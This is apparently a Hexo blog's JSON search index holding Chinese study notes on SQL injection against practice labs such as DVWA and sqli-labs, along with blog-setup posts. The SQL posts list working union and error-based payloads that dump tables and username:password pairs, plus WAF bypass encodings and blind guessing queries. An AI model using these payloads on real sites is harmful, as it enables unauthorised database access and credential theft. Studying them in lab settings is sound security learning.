{"meta":{"title":"Hexo","subtitle":"","description":"","author":"Edmund0A","url":"https://Edmund0A.github.io","root":"/"},"pages":[{"title":"404","text":"","path":"404/index.html","date":"02-07","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"02-07","excerpt":""}],"posts":[{"title":"sql注入基本笔记_1","text":"union 联合查询🔺查询当前数据库名报错的语法 1（如and1=2）+ union select 1,database() 🔺查询当前数据库版本 1union select 1,version() 🔺查询当前数据库 表名 1union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 🔺查询当前数据库所有表，并且拼接在一行显示 1union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+ 🔺查询当前数据库users中表所有字段，并且拼接在一行显示 1union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+ 🔺查询当前数据库users中表username和password字段中的信息，并且拼接在一行显示 1union select 1,group_concat(username,0x3a,password),3 from users--+ 联合查询报错型注入🔺加单引号报错，然后在回显点显示当前数据库所有表，并且拼接在一行显示 1?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+ 🔺爆字段 1?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+ 🔺爆值 1?id=1' and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+ updatexml报错注入🔺爆数据库版本信息 1?id=1' anandd（双写and绕过waf） updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) --+ 🔺链接用户 1?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) 🔺爆库 1updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1) 🔺爆表 1?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1 🔺爆字段 1?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1) 🔺爆字段内容 1?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)","path":"2020/08/08/sql注入基本笔记_1/","date":"08-08","excerpt":"","tags":[]},{"title":"SQL注入点的判断","text":"🔺⚪▲ 🔺 SQL注入点的判断⚪ 通常情况对于SQL注入点的基本判断通常情况下，可能存在 Sql 注入漏洞的 Url 是类似这种形式 ：http://xxx.xxx.xxx/abcd.php?id=XX 对 Sql 注入的判断，主要有两个方面：1.该带参数的 Url 是否存在 Sql 注入？2.如果存在 Sql 注入，是属于哪种 Sql 注入？对于可能存在 Sql 注入攻击的 ASP/PHP/JSP 动态网页中，一个动态网页中可能只有一个参数，也可能有多个参数。可能是整型参数也可能是字符串型参数，如果带有参数的 动态网页且此网页访问了数据库，就有可能存在 Sql 注入。若没有进行过字符过滤，则发生SQL注入的可能性就很大。 ⚪ 判断是否存在注入漏洞▲ 单引号判断在参数后面加上单引号，如： 1http://xxx/abc.php?id=1' 此时如果页面返回有错误，则证明是有存在注入漏洞。因为无论字符型还是整型都会因为单引号个数不匹配而报错。也存在有未报错的情况，这种情况不代表不存在sql注入漏洞，有可能是页面对单引号做了过滤，这种情况下需要用其他方法语句注入。 ⚪ 判断注入漏洞类型通常的sql注入漏洞分为两种类型，即数字型和字符型 。所有的类型都是根据数据库本身表的类型所产生的，在创建表的时候其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但无论怎么分常用的查询数据类型总是以数字与字符来区分的，因此就会产生注入点为何种类型。 ▲ 数字型的判断当输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下： select * from &lt;表名&gt; where id = x 这种类型可以使用经典的 and 1=1 和 and 1=2 来判断：※ Url 地址中输入 http://xxx/abc.php?id= x and 1=1 页面依旧运行正常，继续进行下一步；※ Url 地址中继续输入 http://xxx/abc.php?id= x and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。原因如下：当输入 and 1=1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = x and 1=1无语法错误且逻辑判断正确，返回正常；当输入 and 1=2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = x and 1=2无语法错误，但是逻辑判断为假，则返回错误。假设如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况： 12select * from &lt;表名&gt; where id = 'x and 1=1'select * from &lt;表名&gt; where id = 'x and 1=2' 查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，不会出现以上结果，故假设不成立。 ▲ 字符型判断当输入的参 x 为字符型时，通常 abc.php 中 SQL 语句类型大致如下： 1select * from &lt;表名&gt; where id = 'x' 这种类型我们同样可以使用 and &#39;1&#39;=&#39;1 和 and &#39;1&#39;=&#39;2来判断：Url 地址中输入 http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1 页面运行正常，继续进行下一步。Url 地址中继续输入 http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2 页面运行错误，则说明此 Sql 注入为字符型注入。原因如下当输入 and ‘1’=’1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = &#39;x&#39; and &#39;1&#39;=&#39;1&#39;该语句语法正确，逻辑判断正确，返回正确。当输入 and ‘1’=’2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = &#39;x&#39; and &#39;1&#39;=&#39;2&#39;该语句语法正确，但逻辑判断错误，则返回正确。","path":"2020/08/01/SQL注入点的判断/","date":"08-01","excerpt":"","tags":[]},{"title":"SQL注入绕过","text":"🔺⚪▲ 🔺 关键字的绕过⚪ 过滤如对and进行过滤，可以尝试：▲ 对于and,or的绕过可以尝试一下&amp;&amp;,||,异或特殊符号注入▲ 使用注释符绕过，比如: /*!and*/ uni/**/on se/**/lect▲ 大小写绕过: ANd UniOn SeleCt▲ 双关键字绕过: ununionion seselectlect▲ 关键字替换（在关键字中间可插入将会被WAF过滤的字符） – 例如SELECT可插入变成a&lt;nd，一旦插入字符被过滤，&lt;它将作为and传递。空格代替：+ %20 %09 %0a %0b %0c %0d %a0 %00 /**/ /!/ ⚪ 大小写混合如果正则表达式只针对小写或大写的关键字进行匹配处理，根据数据库以不区分大小写的方式处理SQL关键字的特性，改变大小写。 1https://mp.csdn.net/index.php?id=-15 uNIoN sELecT 1,2,3,4 ⚪ 替换关键字这种情况下大小写转化无法进行绕过而且正则表达式会替换或删除select、union这些关键字，可以先摸清楚后台的过滤机制，针对正则过滤进行利用，如果select、union这些关键字只匹配一次就可以利用双写关键字进行绕过。 1https://mp.csdn.net/index.php?id=-15 UNIunionON SELselectECT 1,2,3,4 ⚪ 使用编码▲ URL编码如在Chrome中输入一个链接非保留字的字符浏览器会对其URL编码如空格变为%20、单引号%27、左括号%28、右括号%29。普通的URL编码可能无法实现绕过，不过存在某种情况比如URL编码只进行了一次解码过滤，那么这时候就可以用两次URL编码进行绕过。 1未编码前：?id=-1' UNION SELECT 1,2,3,4 --+# 1一次编码后：?id=-1%27%20UNION%20SELECT%201,2,3,4%20--+# 1二次编码后：?id=-1%2527%2520UNION%2520SELECT%25201,2,3,4%2520--+# ▲ 十六进制编码对后台针对单引号或者关键字进行处理，就可以使用16进制，把 ‘glbimreb21’ 变为 0x676c62696d7265623231,就可不需要单引号包裹着变量进行简单的绕过了，在用 16进制进行绕过时，16进制前面要加0x。 1转换前：?id=-55' union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema='glbimreb21' --+ 1转换后：?id=-55' union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema=0x676c62696d7265623231--+ ▲ Unicode编码Unicode是一种行业标准，它可以用不同的字符编码表示，Unicode有标准编码和非标准编码。常用的几个符号的一些Unicode编码单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9举例： **?id=10%D6’%20AND%201=2%23 SELECT ‘Ä’=‘A’; #1** 两个示例中，前者利用双字节绕过，对单引号转义操作变成’，就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用。第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在Unicode编码种类繁多，基于黑名单的过滤器无法处理所有情况，从而实现绕过。","path":"2020/07/26/SQL注入绕过/","date":"07-26","excerpt":"","tags":[]},{"title":"SQL注入 - - -猜解实践","text":"🔺⚪▲ 🔺 SQL注入—猜解这里使用的是DVWA平台进行注入，具体DVWA安装及配置方法、配置中常见问题网址已给出，这里不再赘述。▲首先进入DVWA主页并登录，选择“SQL injection”：▲使用控制参数的方法，让网址返回我们需要的信息。首先输入“1”并查看回显：（URL中ID=1，说明php页面通过get方法传递参数）▲此时点击右下角”View Source”查看源代码：其中可见SQL查询代码：由此可见实际执行的sql语句是 1SELECT first_name, last_name FROM users WHERE user_id = '1'; ▲（此方法摘自大佬的博客）如果使用其他方法，在输入框输入 1’ order by 1#，实际sql语句便会更改为： 1SELECT first_name, last_name FROM users WHERE user_id = '1' order by 1#`; 语句的意思是查询users表中user_id为1的数据并按第一字段排行。 ▲输入 1’ order by 1# 和 1’ order by 2# 时都返回正常：▲输入 1’ order by 3# 时，返回错误：由此可得users表中只有两个字段，数据为两列。继续使用联合查询获取信息。▲输入 1’ union select database(),user()# 开始查询，得到返回：从中我们可以得到一些信息—网站使用数据库为dvwa，执行查询的用户名额为root@localhost。▲输入 1’ union select version(),@@version_compile_os# 进行查询，再次得到返回信息：则可以知道当前数据库版本为 : 5.6.31-0ubuntu0.15.10.1.，当前操作系统为 : debian-linux-gnu。","path":"2020/07/19/SQL注入 - - -猜解实践/","date":"07-19","excerpt":"","tags":[]},{"title":"sql注入基础回头","text":"🔺⚪▲ 🔺sql注入的概念 sql注入是指应用对于使用者所输入的非法恶意语句的审查未经过判断或过滤不严，导致使用者刻意将恶意sql查询或添加语句输入参数中，通过欺骗数据库进行非授权的恶意查询，进行解析攻击。 🔺web三层架构的解析三层架构就是遵循符合“高内聚，低耦合”思想，将各个功能模块划分为表示层（UI）、业务逻辑层（BLL）和数据访问层（DAL）三层架构，各层之间采用接口相互访问，并通过对象模型的实体类作为数据传递的载体，不同的对象模型的实体类一般对应于数据库的不同表，实体类的属性与数据库表的字段名一致。（摘自百度百科词条） 🔺sql注入原理每当我们访问动态网页时, Web 服务器会向数据访问层发起 Sql 查询请求，如果权限验证通过就会执行 Sql 语句。结合用户的输入数据动态构造 Sql 语句，如果用户输入的数据被构造成恶意 Sql 代码，Web 应用又未对动态构造的 Sql 语句使用的参数进行审查，则会造成恶意语句的渗透，便是sql注入的基本形式。 ⚪sql注入影响▲ 攻击者不经授权便可获取到用户数据，借此盗取用户隐私信息；▲ 若网站拥有写入权限，攻击者甚至可以写入木马，对网站造成极大损害；▲ 攻击者拥有对其网站数据库的修改权限，可以肆意更改数据库中的内容；▲ 攻击者可以通过其他步骤获取到服务器的最高权限，并通过后门等方法，对服务器进行控制修改与操作。 ⚪sql注入常用语句▲ 判断是否存在注入点 1; and 1=1 and 1=2 ▲ 猜表 12and 0&lt;&gt;(select count(*) from *) and 0&lt;&gt;(select count(*) from admin) ---判断是否存在admin这张表 ▲ 猜帐号数目（如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个 ） 12and 0&lt;(select count(*) from admin) and 1&lt;(select count(*) from admin) ▲ 猜解字段名称 （在len( ) 括号里面加上我们想到的字段名称. ） 123and 1=(select count(*) from admin where len(*)&gt;0)-- and 1=(select count(*) from admin where len(用户字段名称name)&gt;0) and 1=(select count(*) from admin where len(_blank&gt;密码字段名称password)&gt;0) ▲ 猜解各个字段的长度 （猜解长度就是把&gt;0变换 直到返回正确页面为止 ） 1234567and 1=(select count(*) from admin where len(*)&gt;0) and 1=(select count(*) from admin where len(name)&gt;6) 错误 and 1=(select count(*) from admin where len(name)&gt;5) 正确 长度是6 and 1=(select count(*) from admin where len(name)=6) 正确and 1=(select count(*) from admin where len(password)&gt;11) 正确 and 1=(select count(*) from admin where len(password)&gt;12) 错误 长度是12 and 1=(select count(*) from admin where len(password)=12) 正确","path":"2020/07/12/sql注入基础回头/","date":"07-12","excerpt":"","tags":[]},{"title":"SQL靶场的建立","text":"🔺SQL靶场搭建▲ 本次自学搭建sql靶场，使用前请自行配置好bitnami软件； ⚪下载安装靶场▲1. 进入页面下载靶场文件：SQLI靶场；▲2. 将靶场文件压缩包解压至bitnami软件目录下的WAMP中apache2的htdocs文件夹内。 ⚪靶场的基础设置与运行▲1. 【解压与设置】解压完毕后，进入 “sqli-labs-master”文件夹内的“sql-connerctions”文件夹，打开其中的“db-creds.inc” 文件进行编辑。在该文件我们可以看到一串代码： 12345678&lt;?php//give your mysql connection username n password$dbuser ='root';$dbpass ='root';$dbname =\"security\";$host = 'localhost';$dbname1 = \"challenges\";?&gt; 选定其中$dbuser =&#39;root&#39;;项，将 root 替换为你所要设置的用户名。选定其中$dbpass =&#39;root&#39;;项，将 root 替换为你所要设置的密码。设置完密码后，保存并关闭；▲2. 【初步运行】在bitnami文件源目录下，打开manager-windows.exe文件，选择Open phpMyAdmin选项，进入页面，输入上一步所设置的用户名和密码，确认后登陆成功即可以关闭页面。▲3. 【开始使用】此时，进入sqli-labs-master文件夹内，选择index.html即可成功进入靶场，开始攻克难关！","path":"2020/03/29/SQL靶场的建立/","date":"03-29","excerpt":"","tags":[]},{"title":"本人的首次搭建hexo+github博客","text":"🔺组件准备步骤⚪node的安装▲进入node官网选择下载长期支持版； ▲下载后自行选择路径并安装。 ⚪注册一个GitHub账号▲进入GitHub官网，按照注册提示进行注册；▲在邮箱验证后，进入网址创建页面；▲在“Repository name”处填入自己的博客网址，格式为用户名.github.io(在用户名处填入自己注册账号时所用的用户名)，GitHub帐号注册步骤基本完成； ⚪git for windows组件的安装▲进入git官网，并在官网首页选择download下载安装包；▲下载安装包后，自行选择安装路径后执行安装，除安装时有两点需要注意外，其他建议都保持默认设置；※注意！安装到该步骤后勾选下方选项：Don’t creat a Start Menu folder；※注意！安装到该步骤后选择第二项Use Windows’ default console window； ▲至此，git安装步骤完成。 🔺设置配置⚪githubSHH的配置▲在git的安装目录处运行git-bash.exe运行界面如下：▲输入各种组件命令后回车安装组件（Github的注册邮箱地址即注册账号时的验证邮箱）；▲连续两次回车跳过设置密匙并形成密匙阵列；▲将命令窗口最小化后进入GitHub官网后进入个人的setting页面更改其他设置；▲按图选择SSH and GPG keys选项，并点击New SSH key；▲Title处填入自己的用户名，Key处填入用记事本方式打开的C:\\Users\\DELL.ssh路径的id_rsa.pub文件内的所有内容；▲至此，SSH配置完成。 ⚪Hexo的配置▲进入Hexo官网，可以发现官网首页的安装命令；▲在想要安装Hexo组件的盘中新建一个名为“blog”的文件夹，并在该blog文件夹内呼出cmd程序，并将事先打开的Hexo官网首页的安装命令复制到cmd运行框内并运行安装；▲安装后再输入hexo init +博客名指令进行初始化；▲初始化完成后，在运行框内输入cd +博客名进入博客，并输入npm install指令，回车安装；▲安装完成后，输入hexo s -p 5555（此处选择555端口），运行结束后就可以在localhost:5555地址看到自己的博客了。 🔺其他组件⚪自行安装sublime并按照博客主题修改设置。🔺至此，博客搭建完成。","path":"2020/02/15/本人的首次搭建hexo+github博客/","date":"02-15","excerpt":"","tags":[]},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","path":"2020/02/07/hello-world/","date":"02-07","excerpt":"","tags":[]}]}